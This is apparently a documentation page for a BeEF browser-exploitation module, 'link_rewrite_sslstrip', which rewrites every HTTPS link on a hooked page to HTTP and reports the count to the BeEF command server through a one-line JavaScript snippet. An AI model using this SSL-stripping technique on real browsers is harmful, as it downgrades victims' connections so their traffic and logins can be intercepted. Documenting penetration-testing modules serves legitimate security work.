## Summary

* **Objective**: Replace all HTTPS links to HTTP
* **Authors**: bcoles
* **Browsers**: All

* [Code](https://github.com/beefproject/beef/tree/master/modules/hooked_domain/link_rewrite_sslstrip)

## Internal Working

replace the protocol portion of all links from HTTPS to HTTP.

```js

beef.net.send('<%= @command_url %>', <%= @command_id %>, 'result='+beef.dom.rewriteLinksProtocol(old_protocol, new_protocol, selector)+' '+old_protocol+' links rewritten to '+new_protocol);

```

## Feedback
